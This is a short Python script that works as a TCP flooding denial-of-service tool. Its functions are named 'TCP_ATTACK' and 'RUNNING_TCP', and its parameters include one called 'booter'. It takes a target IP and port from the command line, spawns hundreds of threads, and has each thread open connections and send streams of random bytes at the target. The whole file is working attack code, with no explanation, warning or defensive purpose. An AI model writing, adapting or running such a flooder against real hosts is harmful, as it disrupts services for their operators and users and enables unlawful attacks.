import socket,sys,threading,os

def TCP_ATTACK(ip,port,spam_send,booter,size):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        s.connect_ex((ip,port))
        for _ in range(booter):
         for _ in range(spam_send):
            s.sendall(os.urandom(size))
            s.send(os.urandom(size))
    except:
       pass

def RUNNING_TCP(ip,port,time,spam_send,booter,size):
   for _ in range(time):
    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()
    threading.Thread(target=TCP_ATTACK,args=(ip,port,spam_send,booter,size)).start()

IP = ''
PORT =0
TIME = 0
SPAM = 0
BOOTER = 0
SIZE = 0

if len(sys.argv) == 7:
    IP = str(sys.argv[1])
    PORT = int(sys.argv[2])
    TIME = int(sys.argv[3])
    SPAM = int(sys.argv[4])
    BOOTER = int(sys.argv[5])
    SIZE = int(sys.argv[6])
else:
    exit()

for _ in range(50):
 threading.Thread(target=RUNNING_TCP,args=(IP,PORT,TIME,SPAM,BOOTER,SIZE)).start()